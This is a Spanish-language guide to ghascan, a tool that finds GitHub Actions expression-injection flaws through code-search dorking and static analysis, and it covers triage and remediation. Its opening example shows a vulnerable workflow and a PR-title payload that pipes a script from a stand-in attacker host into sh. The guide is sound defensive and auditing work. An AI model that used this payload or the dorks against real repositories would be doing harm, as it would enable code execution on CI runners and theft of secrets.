# INSTRUCTIVO ghascan

Guia completa para instalar, ejecutar y sacar provecho de `ghascan`.
Incluye lo basico (dorking + SAST) y lo que va mas alla: triage, remediacion,
automatizacion y uso responsable.

---

## 0. Que problema resuelve

GitHub Actions interpola expresiones `${{ ... }}` **antes** de ejecutar el shell.
Si la expresion contiene un dato que un atacante puede escribir (titulo de issue,
cuerpo de PR, comentario, nombre de branch, label), el runner ejecuta ese texto
como codigo:

```yaml
on: pull_request_target
jobs:
  greet:
    runs-on: ubuntu-latest
    steps:
      - run: echo "Hola ${{ github.event.pull_request.title }}"
```

Un PR con titulo `$(curl https://attacker.tld/x.sh | sh)` se ejecuta en el
runner. Si el job tiene secrets o `GITHUB_TOKEN` con write, el impacto va de
robo de credenciales a publicacion de un release envenenado.

`ghascan` busca ese patron a escala y descarta los casos que no son explotables.

---

## 1. Instalacion

### 1.1 pip / pipx (recomendado)

```sh
cd ghascan
pipx install .
```

`pipx` crea un entorno aislado y deja el comando `ghascan` en PATH. Si no
tenÃ©s `pipx`:

```sh
python -m pip install --user .
```

Verificar:

```sh
ghascan --version
ghascan selftest
```

### 1.2 Linux / macOS (instalador)

```sh
cd ghascan
chmod +x install.sh
./install.sh
```

Queda en `~/.local/share/ghascan` y el launcher en `~/.local/bin/ghascan`.
Si `~/.local/bin` no estÃ¡ en PATH, el instalador te lo recuerda.

### 1.3 Windows (instalador)

```powershell
cd "D:\Project\Tools Instaladas\ghascan"
powershell -ExecutionPolicy Bypass -File .\install.ps1
```

Queda en `%LOCALAPPDATA%\ghascan` y el launcher en
`%USERPROFILE%\.local\bin\ghascan.cmd`. El instalador agrega esa carpeta al
PATH del usuario: **abrÃ­ una terminal nueva** para que tome efecto.

### 1.4 InstalaciÃ³n remota

Los instaladores no descargan de ninguna URL por defecto. Si publicÃ¡s tu copia:

```sh
GHASCAN_RAW=https://raw.githubusercontent.com/emmanuelalexander/ghascan/main ./install.sh
```

```powershell
.\install.ps1 -Raw https://raw.githubusercontent.com/emmanuelalexander/ghascan/main
```

> El upstream declarado por el proyecto original
> (`github.com/nekros1xx/ghascan`) hoy devuelve 404, asÃ­ que no existe un
> `curl | sh` oficial contra esa URL. Ver `NOTICE.md`.

### 1.5 Sin instalar

```sh
python ghascan.py --version
python ghascan.py demo
```

Requisitos: Python 3.9+. Opcional: `pip install pyyaml` (mejor parser).

### 1.6 Verificar

```sh
ghascan selftest
```

Debe imprimir 12 `OK` y `selftest: OK`. Si algo falla, el problema es la
instalacion, no el objetivo.

---

## 2. Primer contacto (sin token, sin red)

```sh
ghascan demo
```

Analiza 8 workflows de ejemplo:

| Archivo | Resultado esperado |
| --- | --- |
| `pr-title.yml` | CRITICAL |
| `comment.yml` | CRITICAL |
| `env.yml` | CRITICAL (GITHUB_ENV) |
| `script.yml` | CRITICAL (github-script) |
| `safe.yml` | FALSE_POSITIVE (usa `env:` intermedio) |
| `disabled.yml` | FALSE_POSITIVE (`if: false`) |
| `gated.yml` | FALSE_POSITIVE (gate de label) |
| `push-only.yml` | FALSE_POSITIVE (trigger incorrecto) |

Genera `ghascan-out/ghascan-<fecha>.{json,html,pdf}`. Abri el HTML y desplega
un CRITICAL: vas a ver explicacion, PoC, linea exacta y remediacion.

---

## 3. Token de GitHub

### 3.1 Cuando hace falta

- `dork` y `search`: **siempre** (Code Search API exige auth).
- `scan --repo/--org/--user`: opcional. Sin token, 60 req/h y solo publico.
- `scan --local`, `demo`, `selftest`, `queries`: no.

### 3.2 Crear el token

1. GitHub -> Settings -> Developer settings -> Personal access tokens.
2. **Fine-grained** (recomendado): acceso de solo lectura a `Contents` y
   `Metadata` en los repos a auditar. Para code search global, un token
   classic con `public_repo` suele ser lo practico.
3. **Classic**: scope `public_repo` para repos publicos; `repo` si vas a
   escanear repos privados.
4. Copia el token una sola vez y guardalo en una variable de entorno, no en
   el comando (queda en el historial).

### 3.3 Configurar

Linux/macOS:

```sh
export GITHUB_TOKEN=ghp_xxx
# o varios, separados por coma:
export GITHUB_TOKENS=ghp_a,ghp_b,ghp_c
```

Windows PowerShell (sesion actual):

```powershell
$env:GITHUB_TOKEN = 'ghp_xxx'
```

Windows permanente:

```powershell
[Environment]::SetEnvironmentVariable('GITHUB_TOKEN','ghp_xxx','User')
```

Archivo (un token por linea, admite comentarios con `#`):

```sh
ghascan dork --all --tokens-file tokens.txt
```

### 3.4 Multi-token

Code search permite ~10 requests/minuto por token. `ghascan` rota tokens en
round-robin y espera lo justo cuando todos estan en enfriamiento.

| Tokens | 43 dorks, 100 resultados c/u |
| --- | --- |
| 1 | ~4-5 min |
| 3 | ~2 min |
| 5 | ~1 min |

No inventes tokens ni uses cuentas ajenas: el rate limit es por cuenta y el
abuso termina en ban.

---

## 4. Dorking: los 43 patrones

```sh
ghascan queries
```

Los dorks cubren:

- Titulo/cuerpo de PR con `pull_request_target`.
- Titulo/cuerpo de issue y comentarios.
- Reviews y discussion.
- `github.head_ref` y `pull_request.head.ref`.
- `toJSON(github.event.issue|pull_request|comment|event)`.
- `contains()` / `startsWith()` sobre datos del evento.
- `format()` con titulo de PR/issue.
- Labels y campos exoticos (`head.repo.description`, `homepage`).
- `github-script` con datos del evento.
- `GITHUB_ENV` / `GITHUB_PATH`.
- Outputs de steps (`steps.*.outputs`) mezclados con eventos.
- `workflow_dispatch` inputs en `run:` y `script:`.

### 4.1 Correr un subconjunto

```sh
ghascan dork --queries 1,2,3,4,5 --max 50
ghascan dork --queries 1-10 --max 100
```

### 4.2 Correr todo

```sh
ghascan dork --all --max 100 --format json,html,pdf --out ./dork
```

### 4.3 Acotar a una org o repo

```sh
ghascan dork --all --org mi-org --max 50
ghascan dork --queries 1,2,3 --repo mi-org/mi-repo --max 100
```

El filtro se agrega a la query (`org:mi-org` / `repo:mi-org/mi-repo`), asi que
GitHub devuelve solo eso.

### 4.4 Busqueda libre

```sh
ghascan search --query '"pull_request_target" "github.event.pull_request.title" path:.github/workflows' --max 100
```

Util para vectores que no estan en los 43 (por ejemplo, campos nuevos de la API).

---

## 5. Escaneo de repos y organizaciones

### 5.1 Un repo

```sh
ghascan scan --repo owner/name
```

Descarga el arbol del branch por defecto, lista `.github/workflows/*.yml|yaml`
y analiza cada uno. Los archivos se bajan por `raw.githubusercontent.com`
(no gastan cuota de API).

### 5.2 Una org

```sh
ghascan scan --org mi-org --max-repos 200
```

Lista repos (sin forks por defecto), recorre cada uno y deduplica hallazgos por
`repo + path + hash`.

Para una org grande, empeza con `--max-repos 20`, mira el reporte y despues
amplia. El modo org hace 1 request de tree por repo + 1 de lista cada 100 repos.

### 5.3 Un usuario

```sh
ghascan scan --user someuser --max-repos 50
```

### 5.4 Local

```sh
ghascan scan --local .
ghascan scan --local /ruta/repo --all-yaml
```

`--all-yaml` analiza todo `.yml`/`.yaml`, no solo `.github/workflows/`. Util
para auditar plantillas, reusable workflows en carpetas raras o fixtures.

### 5.5 Un archivo

```sh
ghascan scan --file .github/workflows/release.yml
```

---

## 6. Leer el reporte

### 6.1 Veredictos

| Veredicto | Significado | Accion |
| --- | --- | --- |
| `CRITICAL` | control total + trigger abierto + secrets o write | arreglar ya |
| `HIGH` | control total abierto, o limitado con impacto | arreglar en el sprint |
| `MEDIUM` | requiere permisos (`workflow_dispatch`, label, reusable) | revisar |
| `LOW` | requiere permisos altos y sin secrets | backlog |
| `FALSE_POSITIVE` | eliminado por reglas | nada |

El `score` es un CVSS aproximado, no un CVSS formal. Sirve para ordenar.

### 6.2 Campos clave del JSON

```json
{
  "repo": "owner/name",
  "path": ".github/workflows/x.yml",
  "verdict": "CRITICAL",
  "trigger_openness": "OPEN",
  "who_can_trigger": "Anyone - pull_request_target is open to all GitHub users",
  "secrets": ["GITHUB_TOKEN"],
  "has_write_permissions": true,
  "active": [
    {"line": 12, "expression": "${{ github.event.pull_request.title }}",
     "control": "FULL_CONTROL", "context": "run"}
  ],
  "eliminated": [
    {"rule": "R7B_EXACT_GATE", "reason": "Gate de match exacto: ..."}
  ],
  "poc": "...",
  "remediation": "..."
}
```

`eliminated` es la trazabilidad de los falsos positivos: si un triager dice
"esto no es explotable", podes mostrar que regla lo descarto y por que.

### 6.3 Niveles de control

| Nivel | Quien controla | Ejemplo |
| --- | --- | --- |
| `FULL_CONTROL` | cualquier usuario de GitHub | titulo/cuerpo de issue, comentario |
| `LIMITED_CONTROL` | cualquiera, con restricciones de charset | nombre de branch, label |
| `DISPATCH_INPUT` | colaborador con write | `workflow_dispatch.inputs` |
| `NO_CONTROL` | nadie | numero de issue, `github.actor` |
| `UNKNOWN` | incierto | campo nuevo o reusable workflow |

### 6.4 Reglas de FP

| Regla | Que descarta |
| --- | --- |
| `R1_COMMENT` | linea comentada |
| `R2_JOB_DISABLED` | job con `if: false` |
| `R3_STEP_DISABLED` | step con `if: false` |
| `R4_TRIGGER` | expresion que necesita un evento ausente |
| `R7_ENV/WITH` | `env:`/`with:` (no es shell) |
| `R7B_EXACT_GATE` | `if: campo == 'literal'` |
| `R8_HEREDOC` | heredoc citado (`<<'EOF'`) |

Si un hallazgo queda `FALSE_POSITIVE` pero el workflow te parece raro, corre
`--verbose` y revisa `eliminated`. Las reglas son conservadoras: prefieren
marcar FP antes que inventar un CRITICAL.

---

## 7. Triage manual (lo que la tool no decide)

`ghascan` dice **donde mirar**. Antes de reportar:

1. **Confirmar el trigger real.** `on:` puede tener `types` que no incluyen
   `opened`/`edited`. Si el workflow solo corre con `labeled`, el atacante
   necesita permisos.
2. **Confirmar el contexto.** Que la expresion este en `run:` o `script:`, no
   en `name:`/`env:`.
3. **Confirmar secrets y permisos.** `secrets: inherit`, `GITHUB_TOKEN` write,
   `permissions: write-all`, o un PAT guardado como secret.
4. **Confirmar el checkout.** `pull_request_target` + `actions/checkout` del
   `head.sha` es la combinacion clasica de RCE + robo de secrets.
5. **Probar en un fork propio.** Nunca en el repo de un tercero sin permiso.
   El PoC benigno (`$(echo GHA_POC)`) alcanza para demostrar ejecucion.
6. **Medir el impacto real.** Un `echo` con `GITHUB_TOKEN` read-only es LOW.
   El mismo `echo` con `permissions: write-all` y `secrets: inherit` es CRITICAL.

Checklist de evidencia para el reporte:

- URL del workflow y linea exacta.
- Trigger y `types`.
- Por que el atacante controla el dato.
- PoC benigno + salida esperada.
- Secrets/permisos alcanzables.
- Remediacion concreta.

---

## 8. Remediacion

### 8.1 Patron seguro

```yaml
- name: greet
  env:
    TITLE: ${{ github.event.pull_request.title }}
  run: |
    printf '%s\n' "$TITLE"
```

La expresion se evalua en `env:` y el shell solo ve una variable citada. No hay
interpolacion de codigo.

### 8.2 Reglas

1. Nunca metas `${{ github.event.* }}` en `run:` ni en `script:`.
2. Usa `env:` como frontera y cita siempre (`"$VAR"`).
3. Evita `pull_request_target` con checkout del codigo del PR.
4. `permissions: contents: read` por defecto; subi solo lo necesario.
5. Valida el dato con allowlist antes de usarlo.
6. Preferi `actions/github-script` con `github.rest.*` y datos pasados por
   `env`, no interpolados en el script.

### 8.3 Caso GITHUB_ENV

Incorrecto:

```yaml
- run: echo "TITLE=${{ github.event.issue.title }}" >> "$GITHUB_ENV"
```

Correcto:

```yaml
- env:
    TITLE: ${{ github.event.issue.title }}
  run: |
    {
      echo "TITLE<<EOF"
      printf '%s\n' "$TITLE"
      echo "EOF"
    } >> "$GITHUB_ENV"
```

---

## 9. Automatizacion

### 9.1 Cron en GitHub Actions

```yaml
name: gha-audit
on:
  schedule: [{ cron: '0 6 * * 1' }]
  workflow_dispatch:
permissions:
  contents: read
jobs:
  ghascan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with: { python-version: '3.12' }
      - run: pip install pyyaml
      - run: python ghascan.py scan --local . --format json,html --fail-on CRITICAL,HIGH
      - uses: actions/upload-artifact@v4
        if: always()
        with:
          name: ghascan-report
          path: ghascan-out/
```

### 9.2 Script local (Windows)

```powershell
$env:GITHUB_TOKEN = [Environment]::GetEnvironmentVariable('GITHUB_TOKEN','User')
ghascan scan --org mi-org --max-repos 100 --format json,html,pdf --out D:\audit\gha
```

### 9.3 Script local (Linux)

```sh
#!/usr/bin/env sh
set -eu
: "${GITHUB_TOKEN:?falta GITHUB_TOKEN}"
ghascan dork --all --max 100 --format json,html,pdf --out "$HOME/audit/gha"
```

### 9.4 Integracion con jq

```sh
ghascan scan --local . --format json --quiet
jq -r '.findings[] | select(.verdict=="CRITICAL") | "\(.repo)/\(.path) \(.active[0].line)"' \
  ghascan-out/*.json
```

### 9.5 Exit codes

| Codigo | Significado |
| --- | --- |
| 0 | ok |
| 1 | error inesperado |
| 2 | `--fail-on` encontro un veredicto |
| 3 | falta token o argumentos |

---

## 10. Problemas comunes

### 401 / 403 / rate limit

- 401: token invalido o vencido.
- 403 con `rate limit`: espera o agrega otro token.
- Code search tiene un limite aparte (10/min por token). Con `--max 100` y 43
  dorks, un solo token tarda varios minutos; es normal.

### `No module named yaml`

```sh
python -m pip install --user pyyaml
```

Sin PyYAML el tool funciona con fallback por regex, pero pierde precision en
`permissions` y en triggers complejos.

### El PDF no se genera

`ghascan` busca `msedge`, `chrome`, `google-chrome` o `chromium`. Si no hay,
abri el HTML y usa Imprimir -> Guardar como PDF. En Windows, Edge ya viene
instalado; si falla, revisa que la ruta exista.

### Acentos raros en la consola Windows

```powershell
$env:PYTHONIOENCODING = 'utf-8'
chcp 65001
```

### `ghascan` no se reconoce

- Windows: abri una terminal nueva (el PATH se actualiza al iniciar sesion).
- Linux/macOS: `export PATH="$HOME/.local/bin:$PATH"`.

### Falsos negativos

- El workflow usa una expresion armada dinamicamente (concatenacion en `env`).
- El dato llega por `steps.*.outputs` de un step anterior: `ghascan` lo marca
  como `UNKNOWN` o no lo ve. Revisalo a mano.
- Reusable workflow (`workflow_call`): el caller define el trigger real.

---

## 11. Etica y alcance

- Escanea repos publicos o repos donde tengas autorizacion.
- No pruebes PoCs en repos de terceros: un PR con `$(...)` en el titulo es
  ejecucion de codigo en su CI.
- Para un programa de bug bounty, revisa que los workflows esten en scope.
- Reporta con PoC benigno y sin exfiltrar secrets. Si encontras un secret
  expuesto, no lo uses: reportalo y rota la credencial.

---

## 12. Checklist final

- [ ] `ghascan selftest` OK.
- [ ] Token configurado (si vas a dorkear).
- [ ] `ghascan demo` genera JSON/HTML/PDF.
- [ ] `scan --local` sobre tu repo.
- [ ] `scan --org` o `--repo` sobre el objetivo.
- [ ] `dork` con los queries del vector que te interesa.
- [ ] Reporte HTML revisado, CRITICAL/HIGH triageados a mano.
- [ ] PoC benigno reproducido en un fork propio.
- [ ] Remediacion propuesta con `env:` intermedio + permisos minimos.
- [ ] Evidencia y reporte archivados.

---

## 13. Y mas...

- **Dorks nuevos**: agrega el patron a `QUERIES` en `ghascan_lib/patterns.py`
  (mantene el formato `path:.github/workflows`).
- **Campos nuevos de la API**: agrega el campo a `FULL_CONTROL` o
  `LIMITED_CONTROL` y su trigger a `EXPR_TRIGGERS`.
- **Regla de FP nueva**: implementala en `analyze_text` y agrega un test en
  `tests/test_offline.py`.
- **Integracion con Lazarus**: `ghascan` es una tool mas del lab; ingesta su
  README/INSTRUCTIVO al RAG para que el bot explique los modos.
- **Reporte combinado**: corre `ghascan scan --org` + `ghascan dork --all` y
  mergea los JSON con `jq -s`.

---

## 14. Procedencia, licencia y publicacion

`ghascan` es una implementacion independiente. Se derivaron del proyecto
`gha-vuln-scanner` (MIT, Copyright (c) 2025 Sergio Cabrera) los 43 dorks y los
conjuntos de clasificacion de control; el resto del codigo es original.
El detalle esta en `NOTICE.md` y la licencia en `LICENSE`.

El repositorio que ese proyecto declaraba (`github.com/nekros1xx/ghascan`) hoy
devuelve 404, por eso `ghascan` se publicó como copia propia:

- **Repo**: https://github.com/emmanuelalexander/ghascan
- **Instalacion remota**: `-Raw` / `GHASCAN_RAW` apuntando a ese repo.
- **Instalacion normal**: `pipx install .` o los scripts del checkout.

### Publicacion (ya hecha)

1. Repo publico `emmanuelalexander/ghascan` (MIT, con `NOTICE.md`).
2. CI en `.github/workflows/tests.yml`: Ubuntu/Windows/macOS × Python 3.9/3.12/3.13.
   Python 3.9 se prueba en `ubuntu-22.04` porque `ubuntu-latest` (26.04) ya no lo trae.
3. Verificado: `python -m unittest discover -s tests` (12/12), `selftest`, `demo`
   y la instalacion remota real en una carpeta temporal.

One-liner resultante:

```sh
curl -fsSL https://raw.githubusercontent.com/emmanuelalexander/ghascan/main/install.sh \
  | GHASCAN_RAW=https://raw.githubusercontent.com/emmanuelalexander/ghascan/main sh
```

```powershell
iwr -useb https://raw.githubusercontent.com/emmanuelalexander/ghascan/main/install.ps1 -OutFile install.ps1
powershell -NoProfile -ExecutionPolicy Bypass -File .\install.ps1 -Raw https://raw.githubusercontent.com/emmanuelalexander/ghascan/main
```


